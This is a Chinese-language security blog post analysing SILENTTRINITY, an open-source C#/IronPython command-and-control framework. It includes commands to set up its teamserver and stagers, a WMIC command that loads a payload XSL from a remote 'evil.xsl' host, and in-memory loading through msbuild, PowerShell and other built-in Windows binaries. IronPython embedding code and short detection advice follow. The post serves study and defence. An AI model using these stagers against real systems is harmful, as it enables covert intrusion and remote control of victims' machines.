---
layout: post
title: SILENTTRINITY利用分析
---


## 0x00 前言
---

SILENTTRINITY是由byt3bl33d3r开源的一款C2工具，通过C#实现，利用IronPython引擎来执行Python代码，十分值得研究。这款工具通过Python实现payload，不仅提高了效率，而且利用IronPython引擎从内存加载payload，更为隐蔽。

本文将要站在技术研究的角度，分析SILENTTRINITY的原理并进行扩展，最后给出防御检测的建议

地址：

https://github.com/byt3bl33d3r/SILENTTRINITY

## 0x01 简介
---

本文将要介绍以下内容：

- SILENTTRINITY的简单使用
- SILENTTRINITY的实现细节
- C#利用IronPython调用Python的方法
- 防御检测的建议

## 0x02 SILENTTRINITY的简单使用
---

操作方法同meterpreter相似

### 1、安装

```
git clone https://github.com/byt3bl33d3r/SILENTTRINITY.git
cd SILENTTRINITY
python3 -m pip install -r requirements.txt
python3 st.py
```

### 2、开启teamserver

```
python3 teamserver.py <teamserver_ip> <teamserver_password>
```

### 3、连接teamserver

python3 st.py wss://username:<teamserver_password>@<teamserver_ip>:5000

### 4、开启监听

```
listeners
use http
options
start
```

### 5、生成payload

```
stagers
list
use msbuild
generate http
```

### 6、启动方式之一

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml
```

## 0x03 SILENTTRINITY的实现细节
---

源码的文件结构如下：

- SILENTTRINITY，核心文件，C#开发，格式为exe
- SILENTTRINITY_DLL，内容同上，但格式为dll
- Server，控制端，包括多个Python实现的payload

SILENTTRINITY和SILENTTRINITY_DLL功能相同，只是文件格式不同，所以这里以SILENTTRINITY为例

### 1、SILENTTRINITY

实现的功能可参照下图右半部分：

![Alt text](https://user-images.githubusercontent.com/5151193/46646842-cd2b0580-cb49-11e8-9218-73226e977d58.png)

**注：**

图片引用自https://github.com/byt3bl33d3r/SILENTTRINITY

详细说明如下：

#### 1. 启动IronPython引擎，释放资源文件并导入Python环境

资源文件名：IronPython.StdLib.2.7.9.zip

压缩包内的文件为Python的默认模块

如果安装了IronPython，压缩包的文件同默认安装路径下`C:\Program Files\IronPython 2.7\Lib`中的文件内容保持一致

IronPython下载地址：

https://github.com/IronLanguages/ironpython2/releases/tag/ipy-2.7.9

#### 2. 从Server下载stage.zip

stage.zip中包含五个文件：

- IronPython.dll
- IronPython.Modules.dll
- Microsoft.Dynamic.dll
- Microsoft.Scripting.dll
- Main.py

其中，前四个为IronPython引擎的依赖文件，Main.py为主体程序，用于接收控制命令，加载payload，回传输出结果

#### 3. 利用IronPython调用Python

后面将会详细介绍

### 2、Server

作为控制端

modules文件夹下包含所有支持的Python脚本

stagers文件夹下包含三种启动方式：

- msbuild
- powershell
- wmic

#### 1. msbuild

启动方式：

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml
```

流程：

`msbuild.exe`->`.xml`->`C#`

通过msbuild.exe加载msbuild.xml，这里使用了.NET Framework 4.0中支持了的新功能"Inline Tasks"，被包含在元素UsingTask中，可用来在xml文件中执行c#代码

msbuild.xml实现了将加密字符串做base64解码，解密出SILENTTRINITY，最终在内存中加载(C#实现)

这个利用方法我在之前的文章有过利用分析：

[《Use MSBuild To Do More》](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)

#### 2. powershell

启动方式：

执行powershell脚本

流程：

`powershell.exe`->`.ps1`->`C#`

同样是将加密字符串做base64解码，解密出SILENTTRINITY，最终在内存中加载(Powershell实现)，关键代码如下：

```
$asm = [Reflection.Assembly]::Load($UncompressedFileBytes)
$type = $asm.GetType("ST")
$main = $type.GetMethod("Main")
```

表示加载exe中Main下的ST方法


这个利用方法我在之前的文章有过利用分析：

[《利用Assembly Load & LoadFile绕过Applocker的分析总结》](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/)

#### 3. wmic

启动方式：

```
C:\Windows\System32\wbem\WMIC.exe os get /format:"evil.xsl"
```

或者

```
C:\Windows\System32\wbem\WMIC.exe os get /format:"https://example.com/evil.xsl"
```

流程：

`wmic.exe`->`.xsl`->`javascript`

通过wmic.exe加载wmic.xsl，wmic.xsl可以放在本地，也可以放在远程服务器

同样是将加密字符串做base64解码，解密出SILENTTRINITY，最终在内存中加载(JavaScript实现)


这个利用方法我在之前的文章有过利用分析：

[《利用wmic调用xsl文件的分析与利用》](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8wmic%E8%B0%83%E7%94%A8xsl%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/)

#### 4. 其他可供利用的方法

SILENTTRINITY未包括，此处作为扩展，例如：

- regsvr32.exe，《Code Execution of Regsvr32.exe》
- rundll32.exe，[《关于利用rundll32执行程序的分析》](https://3gstudent.github.io/3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90/)



## 0x04 C#利用IronPython调用Python的方法
---

需要使用IronPython，参考资料：

https://ironpython.net/

本节介绍一些基本用法，有助于进一步扩展SILENTTRINITY的功能

### 1、常用的基本脚本

下载安装IronPython：

https://github.com/IronLanguages/ironpython2/tree/master/Src/IronPythonCompiler

开发工具： VS2015

新建C#工程，添加引用：

- IronPyhon
- Microsoft.Scripting

**注：**

编译后生成的exe在执行时需要以下依赖文件：

- IronPython.dll
- IronPython.Modules.dll(有的工程不需要)
- Microsoft.Dynamic.dll
- Microsoft.Scripting.dll


#### 1.简单的hello world程序，调用test.py，输出Hello World

code1:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using IronPython.Hosting;

namespace IronPythonTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var engine = Python.CreateEngine();
            engine.ExecuteFile("test.py");

        }
    }
}
```

test.py:

```
print("Hello World")
```


#### 2.向python脚本传参数并输出

code2:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using IronPython.Hosting;
namespace IronPythonTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var engine = Python.CreateEngine();

            var scope = engine.CreateScope();

            scope.SetVariable("argv", "Hello World");

            engine.ExecuteFile("test.py",scope);
        }
    }
}
```

test.py:

```
print('%s'%argv)
```

#### 3.调用python脚本的main函数

code3:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using IronPython.Hosting;

namespace IronPythonTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var engine = Python.CreateEngine();
            var scope = engine.CreateScope();
            engine.ExecuteFile("test.py",scope);

            dynamic main = scope.GetVariable("main");

            main();


        }
    }
}
```

test.py:

```
def main():
        print("Hello World")
if __name__ == '__main__':
	main("")
```


#### 4.将python脚本的内容存储在变量中并执行

code4:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using IronPython.Hosting;

namespace IronPythonTest
{
    class Program
    {
        static void Main(string[] args)
        {
            string script = "print('%s'%argv)";
            var engine = Python.CreateEngine();
            var scope = engine.CreateScope();
            scope.SetVariable("argv", "Hello World");
            var sourceCode = engine.CreateScriptSourceFromString(script);
            sourceCode.Execute(scope);
        }
    }
}
```

#### 5.python脚本支持第三方库

code5:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using IronPython.Hosting;

namespace IronPythonTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var engine = Python.CreateEngine();
            engine.SetSearchPaths(new[] { "Lib" });
            engine.ExecuteFile("test.py");
        }
    }
}
```

找到IronPython的安装路径，默认为`C:\Program Files\IronPython 2.7`

将其中的Lib目录复制到编译生成的IronPythonTest.exe的同级目录下

test.py:

```
import os
os.system("calc.exe")
```

### 2、使用ipyc将python脚本编译成exe

类似于py2exe的功能

源码：

https://github.com/IronLanguages/ironpython2/tree/master/Src/IronPythonCompiler

编译好的文件可从IronPython的目录中获得

默认安装位置：

```
C:\Program Files\IronPython 2.7\ipyc.exe
```

## 0x05 防御检测
---

SILENTTRINITY的启动程序本身不包含恶意的功能，只是从远程服务器下载文件并利用IronPython调用Python，这是一个完全正常的功能

启动方式上利用了Windows系统本身自带的程序(例如msbuild.exe,powershell.exe,wmic.exe,也可以扩展成regsvr32.exe或rundll32.exe)，较为隐蔽

但SILENTTRINITY需要发起网络连接，传输stage.zip和Python脚本，所以如果程序调用了IronPython并发起了网络连接，极有可能是存在风险的行为

## 0x06 小结
---

本文分析了SILENTTRINITY的实现细节，提出了一些扩展的思路，介绍了C#利用IronPython调用Python的方法，结合SILENTTRINITY的特征，给出防御检测的建议。



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)


